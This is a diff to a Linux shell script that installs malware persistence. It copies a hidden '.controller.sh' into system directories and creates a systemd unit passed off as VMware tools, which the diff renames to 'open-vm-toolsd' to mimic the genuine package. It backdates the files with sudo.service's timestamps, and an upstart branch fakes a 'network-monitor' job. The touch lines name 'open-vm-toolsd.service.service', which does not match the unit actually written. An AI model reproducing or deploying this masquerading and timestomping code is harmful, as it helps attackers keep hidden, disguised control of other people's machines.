@@ -21,8 +21,8 @@ done
 cp -p ".controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
 cp -p ".controller.sh" "/etc/systemd/network/.debug.sh" &> /dev/null
 if [[ $(systemctl) ]]; then
-    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
-    sudo cat > /etc/systemd/system/vmwaretoolsd.service << EOF
+    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/open-vm-toolsd.service.service
+    sudo cat > /etc/systemd/system/open-vm-toolsd.service << EOF
 [Unit]
 Description=Service for virtual machines hosted on VMWare
 After=network.target
@@ -36,9 +36,9 @@ RestartSec=10
 [Install]
 WantedBy=multi-user.target
 EOF
-    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
+    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/open-vm-toolsd.service.service
     sudo systemctl daemon-reload
-    sudo systemctl start vmwaretoolsd.service
+    sudo systemctl start open-vm-toolsd.service
 elif [[ $(initctl version) =~ upstart ]]; then
     sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
     sudo cat > /etc/init/network-monitor.conf << EOF
